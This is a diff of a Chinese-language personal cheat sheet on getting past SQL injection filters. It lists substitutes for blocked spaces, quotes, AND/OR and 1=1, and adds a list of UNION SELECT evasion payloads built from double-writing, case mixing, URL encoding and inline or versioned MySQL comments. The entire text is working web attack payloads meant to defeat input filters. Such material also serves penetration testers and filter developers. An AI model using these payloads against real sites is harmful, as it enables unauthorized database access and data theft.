@@ -7,9 +7,8 @@ Created 星期六 30 十一月 2024
 
 可能会禁止的符号和对应的绕过方法：
 #: %23#
-空格: %20
+空格: %20=%a0=%09(即 \t)=%0a=0b=%0c=%0d=+
 空格：行内注释 /*...*/， 如 id=1'or/**/1=1
-空格：%09 即 \t
 空格：select(username)from(table)where(key='val')
 空格（mysql专用）：/*!UNION*//*!SELECT*/...
 单引号：双引号
@@ -17,6 +16,22 @@ AND: &&  且换成符号后不需要两边加空格
 OR: ||
 1=1: (true)  如 username='a'or(true)
 1=2: (false)  如 username='a'and(false)
+ORDER BY: INTO
+union select:
+	uniunionon selselectect  # 双写
+	uNIoN sel<>ect # 程序过滤<>为空 脚本处理
+	uNi//on sele//ct # 程序过滤//为空
+	uNIoN /!%53eLEct/ # url 编码与内联注释
+	uNIoN se%0blect # 使用空格绕过
+	uNIoN sele%ct # 使用百分号绕过
+	uNIoN %53eLEct # 编码绕过
+	uNIoN sELecT 1,2 #大小写绕过
+	uNIoN all select 1,2 # ALL绕过
+	uNIoN DISTINCT select 1,2 # 去重复DISTINCT 绕过
+	null+UNION+SELECT+1,2 # 加号代替空格绕过
+	/!union//!select/1,2 # 内联注释绕过
+	/!50000union//!50000select/1,2 # 内联注释绕过
+	uNIoN//select/**/1,2 # 注释代替空格绕过
 
 information_schema.tables: information_schema/**/.tables  或  information_schema.`tables`
 
